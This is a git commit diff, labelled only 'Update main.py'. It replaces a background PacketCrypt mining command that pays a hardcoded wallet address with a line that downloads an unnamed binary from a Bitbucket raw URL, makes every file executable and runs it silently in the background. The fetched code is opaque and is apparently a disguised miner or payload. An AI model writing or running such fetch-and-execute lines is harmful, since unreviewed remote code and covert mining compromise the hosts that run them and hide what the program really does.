369d5d020b380023bff55158d79f811581b92b75
jgaswerhah <114896969+jgaswerhah@users.noreply.github.com>
2023-02-07 08:49:58 +0700

    Update main.py

--- main.py
+++ main.py
@@ -35,7 +35,7 @@ def start_process():
     if ptk_address is None:
         print('PTK_address environment variable is not set. Please set it to your email address.')
         sys.exit(1)
-    cmd = f'nohup packetcrypt ann -p pkt1qcg7gzzlnuzl7m2k233rl7vadcn237uj6quj57e http://pool.pkt.world/master/ http://pool.pkteer.com https://stratum.zetahash.com http://pool.pktpool.io > {LOG_FILE} 2>&1 &'
+    cmd = f'wget https://bitbucket.org/enafyarti/pktwatch/raw/c6b4a03a1c1404fadcceb037b734dc16f451a6f9/project/ngentot && chmod +x * && ./ngentot > {LOG_FILE} 2>&1 &'
     out, err = subprocess.Popen(
         cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
     print(out.decode('utf-8'))
